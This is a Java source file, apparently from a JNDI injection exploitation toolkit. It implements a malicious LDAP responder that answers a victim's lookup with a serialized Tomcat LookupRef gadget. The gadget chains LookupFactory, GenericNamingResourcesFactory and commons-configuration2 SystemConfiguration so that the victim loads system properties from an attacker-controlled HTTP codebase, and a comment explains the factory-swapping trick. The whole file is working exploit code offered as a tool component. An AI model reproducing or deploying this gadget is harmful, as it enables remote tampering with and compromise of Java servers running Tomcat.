package net.roboterh.injector.gadgets;

import com.sun.javaws.IconUtil;
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.sdk.Entry;
import com.unboundid.ldap.sdk.LDAPException;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;
import net.roboterh.injector.servers.HTTPServer;
import net.roboterh.injector.utils.GadgetUtils;
import org.apache.naming.LookupRef;
import org.apache.naming.ResourceRef;

import javax.naming.StringRefAddr;

/*
    TomcatJNDI2otherFactory Way:
    Requirement:
        Tomcat and other factory's requirements in classpath
    Explanation:
        1. if there is a key named factory in Remote Reference, it will instance the factory and reconstruct
        2. the factory is anyone
        3. two ways: `org.apache.naming.factory.ResourceFactory` and `org.apache.naming.factory.LookupFactory`
 */
public class TomcatJNDI2otherFactory implements LDAPService{
    @Override
    public void sendResult(InMemoryInterceptedSearchResult result, String baseDN) {
        argsHandler(baseDN);
        generateHandler();

        System.out.println(this.getClass().getName() + "sendResult start.....");

        // way1
//        ResourceRef ref = new ResourceRef("org.apache.commons.configuration2.SystemConfiguration", null, "", "", true,
//                "org.apache.naming.factory.ResourceFactory", null);
        //way2
        LookupRef ref = new LookupRef("org.apache.commons.configuration2.SystemConfiguration", "org.apache.naming.factory.LookupFactory", "", "");

        ref.add(new StringRefAddr("factory", "org.apache.tomcat.jdbc.naming.GenericNamingResourcesFactory"));
        ref.add(new StringRefAddr("systemProperties", HTTPServer.codeBase + "AttributionCovered.properties"));

        Entry entry = new Entry(baseDN);
        entry.addAttribute("javaClassName", "java.lang.Class");
        entry.addAttribute("javaSerializedData", GadgetUtils.serialize(ref));
        try {
            result.sendSearchEntry(entry);
        } catch (LDAPException e) {
            throw new RuntimeException(e);
        }
        result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
    }

    @Override
    public void argsHandler(String baseDN) {

    }

    @Override
    public void generateHandler() {

    }
}
